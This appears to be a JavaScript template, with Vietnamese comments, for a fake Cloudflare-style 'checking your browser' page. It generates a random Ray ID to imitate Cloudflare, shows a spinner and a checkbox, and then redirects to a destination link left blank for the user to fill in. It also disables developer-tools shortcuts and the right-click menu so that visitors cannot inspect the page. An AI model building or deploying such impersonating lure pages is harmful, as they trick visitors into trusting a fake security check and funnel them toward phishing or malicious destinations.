function generateRayID() {
  const chars = 'abcdef0123456789';
  let id = '';
  for (let i = 0; i < 16; i++) {
    id += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return id;
}

// Chỉ tạo Ray ID một lần khi trang được tải
window.addEventListener('DOMContentLoaded', () => {
  const rayId = generateRayID();
  document.getElementById('ray-id').textContent = rayId;

  // Hiện spinner trước khi hiện checkbox
  setTimeout(() => {
    document.getElementById('spinner').style.display = 'none';
    document.getElementById('checkbox-wrapper').style.display = 'flex';
  }, 1000);
});

function redirect() {
  setTimeout(() => {
    window.location.href = ""; // Thay bằng link đích của bạn
  }, 1500);
}

// Chặn F12 và context menu
document.addEventListener('keydown', function (e) {
  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) {
    e.preventDefault();
  }
});
document.addEventListener('contextmenu', function (e) {
  e.preventDefault();
});
